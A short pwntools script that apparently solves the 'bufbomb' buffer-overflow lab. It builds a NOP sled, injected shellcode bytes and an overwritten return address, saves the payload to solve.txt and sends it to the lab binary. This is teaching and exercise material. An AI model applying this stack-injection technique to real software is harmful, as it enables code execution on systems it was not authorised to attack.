from pwn import *

binary = context.binary = ELF('./bufbomb')

p = process(['./bufbomb', '-u', '19780982'])

shellcode = b'\x58\x31\xc0\xb8\x06\x58\x27\x24\xbd\x20\x31\x68\x55\x68\xd6\xad\xf1\xf7\x68\xd7\x9b\x13\x80\xc3'

offset = (0x28+4-len(shellcode))
payload = b''
payload += b'\x90'*offset

payload += shellcode
payload += p32(0x556830d8)


f = open('solve.txt', 'wb')
f.write(payload)


p.sendline(payload)

p.interactive()
